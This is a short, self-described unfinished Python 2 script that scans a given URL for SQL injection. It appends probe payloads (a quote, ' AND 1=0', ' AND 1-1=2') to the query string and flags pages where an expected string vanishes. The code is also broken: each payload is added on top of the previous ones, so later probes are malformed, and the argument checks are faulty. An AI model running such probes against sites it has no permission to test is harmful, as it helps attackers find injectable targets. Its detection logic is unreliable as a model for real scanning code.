#Please note that this script is still in production, it doesn't quite work the way I want it to at the moment.
#Once I complete the SQLi vulnerability trigger module, this will evolve into other types of vulnerability triggers.
import urllib
import urllib2
import sys

def usage():
	print "Usage: python sqlitrigger.py [url] [static string on page]"
	print "Example: python sqlitrigger.py http://example.com/index.php?id=1 example"

args = len(sys.argv)
if args > 4:
	usage()
	exit()
url = sys.argv[1]
string = str(sys.argv[2])
tlist = ["'"," AND 1=0", " AND 1-1=2"] 

for s in tlist:
    url = url+s
    req = urllib2.Request(url)
    response = urllib2.urlopen(req)
    the_page = response.read()
    if string not in the_page:
        print "[*] Error found for: "+url
exit()
